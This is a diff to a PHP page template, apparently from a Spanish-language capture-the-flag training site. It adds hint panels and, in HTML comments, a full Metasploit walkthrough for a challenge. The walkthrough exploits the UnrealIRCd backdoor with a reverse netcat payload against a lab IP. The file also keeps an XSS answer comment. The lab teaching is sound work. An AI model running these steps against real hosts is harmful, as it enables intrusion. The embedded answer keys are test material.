@@ -41,6 +41,26 @@
     <!-- otra forma de explotar: <body onload=alert(flag)> -->
 <?php endif; ?>
 
+<?php if ($reto['slug'] === 'reto11-metasploit'): ?>
+    <!-- nmap -sV IpUsuario -p 6667 //RECONOCER EL SERVICIO -->
+    <!-- 6667/tcp open irc UnrealIRCd //RESULTADO -->
+    <!-- msfconsole // terminal -->
+    <!-- search unreal //buscar exploit -->
+    <!-- exploit/unix/irc/unreal_ircd_3281_backdoor -->
+    <!-- use exploit/unix/irc/unreal_ircd_3281_backdoor //seleccionar exploit -->
+    <!-- configurar objetivo -->
+    <!-- set RHOSTS 192.168.56.112 -->
+    <!-- set payload cmd/unix/reverse_netcat -->
+    <!-- set LHOST 192.168.56.112 -->
+    <!-- run //ejecutar -->
+    <!-- resultado -->
+    <!-- Connected to 192.168.56.112:6667 -->
+    <!-- Sending backdoor command -->
+    <!-- Exploit completed -->
+    <!-- OTRA TERMINAL -->
+    <!-- nc 192.168.56.112 6667 // ejecutar luego Escribir algo para sacar la flag -->
+<?php endif; ?>
+
 <section class="panel">
     <h2>Herramientas y enfoque</h2>
     <p><?= htmlspecialchars(implode(', ', $reto['herramientas']), ENT_QUOTES, 'UTF-8'); ?></p>
@@ -184,6 +204,35 @@
     </section>
 <?php endif; ?>
 
+<?php if ($reto['slug'] === 'reto10-cve'): ?>
+    <section class="panel hint-module">
+        <h2>Pistas</h2>
+        <p>- La versión del servicio puede ser más importante de lo que parece.</p>
+        <p>- Muchas vulnerabilidades conocidas están documentadas públicamente.</p>
+        <p>- Investiga si la versión detectada tiene historial de CVEs.</p>
+    </section>
+<?php endif; ?>
+
+<?php if ($reto['slug'] === 'reto11-metasploit'): ?>
+    <section class="panel hint-module">
+        <h2>Pistas</h2>
+        <p>-  El servicio expuesto utiliza una versión vulnerable de UnrealIRCd.</p>
+        <p>- Identifica el puerto correcto antes de buscar el exploit.</p>
+        <p>- Existe un módulo oficial en Metasploit Framework para esta vulnerabilidad.</p>
+        <p>- Configura correctamente RHOSTS y el payload antes de ejecutar el exploit.</p>
+        <p>- Después de la explotación puede ser necesaria una reconexión manual al servicio.</p>
+    </section>
+<?php endif; ?>
+
+<?php if ($reto['slug'] === 'reto12-privesc'): ?>
+    <section class="panel hint-module">
+        <h2>Pistas</h2>
+        <p>- Empieza enumerando usuario actual, permisos y sistema operativo.</p>
+        <p>- Revisa binarios con permisos especiales, sudo y tareas configuradas localmente.</p>
+        <p>- Las herramientas automaticas ayudan, pero confirma manualmente el hallazgo antes de explotarlo.</p>
+    </section>
+<?php endif; ?>
+
 <section class="panel flag-panel">
     <div>
         <h2>Verificar flag</h2>
@@ -216,6 +265,13 @@
         <div class="answer-modal-card answer-modal-<?= htmlspecialchars($flagResult['type'], ENT_QUOTES, 'UTF-8'); ?>">
             <button class="answer-modal-close" type="button" aria-label="Cerrar mensaje" onclick="this.closest('.answer-modal').remove();">x</button>
             <strong id="flag-modal-title"><?= $flagResult['type'] === 'success' ? 'Flag correcta' : 'Flag incorrecta'; ?></strong>
+            <?php if ($flagResult['type'] === 'success' || $flagResult['type'] === 'error'): ?>
+                <img
+                    class="answer-modal-image"
+                    src="<?= htmlspecialchars(asset('assets/img/' . ($flagResult['type'] === 'success' ? 'feliz.png' : 'triste.png')), ENT_QUOTES, 'UTF-8'); ?>"
+                    alt="<?= $flagResult['type'] === 'success' ? 'Celebracion' : 'Error'; ?>"
+                >
+            <?php endif; ?>
             <p><?= htmlspecialchars($flagResult['message'], ENT_QUOTES, 'UTF-8'); ?></p>
         </div>
     </div>
